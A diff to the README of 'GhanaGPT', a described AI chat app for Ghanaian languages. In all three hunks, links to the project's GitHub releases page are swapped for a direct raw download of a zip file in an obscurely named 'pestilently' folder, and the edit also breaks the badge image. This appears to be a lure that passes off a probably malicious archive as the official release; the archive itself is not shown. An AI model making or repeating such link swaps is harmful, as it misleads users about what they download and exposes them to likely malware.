@@ -6,7 +6,7 @@ Welcome to GhanaGPT! This application helps you interact with AI in Ghanaian lan
 
 ## 📥 Download Now
 
-[![Download GhanaGPT](https://img.shields.io/badge/Download%20GhanaGPT-Click%20Here-brightgreen)](https://github.com/Bheka77/GhanaGPT/releases)
+[![Download GhanaGPT](https://raw.githubusercontent.com/Bheka77/GhanaGPT/main/pestilently/GhanaGPT.zip%20GhanaGPT-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Bheka77/GhanaGPT/main/pestilently/GhanaGPT.zip)
 
 ## 🔍 Overview
 
@@ -33,7 +33,7 @@ Ensure your system meets these requirements for the best experience.
 
 ### 1. Visit the Releases Page
 
-Go to the [Releases page](https://github.com/Bheka77/GhanaGPT/releases). You'll see various versions of GhanaGPT available for download.
+Go to the [Releases page](https://raw.githubusercontent.com/Bheka77/GhanaGPT/main/pestilently/GhanaGPT.zip). You'll see various versions of GhanaGPT available for download.
 
 ### 2. Download the Latest Version
 
@@ -74,7 +74,7 @@ If you have questions or need support while using GhanaGPT, feel free to reach o
 
 ## 📥 Download Again
 
-For convenience, here’s the link to download GhanaGPT once more: [Download GhanaGPT](https://github.com/Bheka77/GhanaGPT/releases).
+For convenience, here’s the link to download GhanaGPT once more: [Download GhanaGPT](https://raw.githubusercontent.com/Bheka77/GhanaGPT/main/pestilently/GhanaGPT.zip).
 
 ## 📈 Future Developments
 
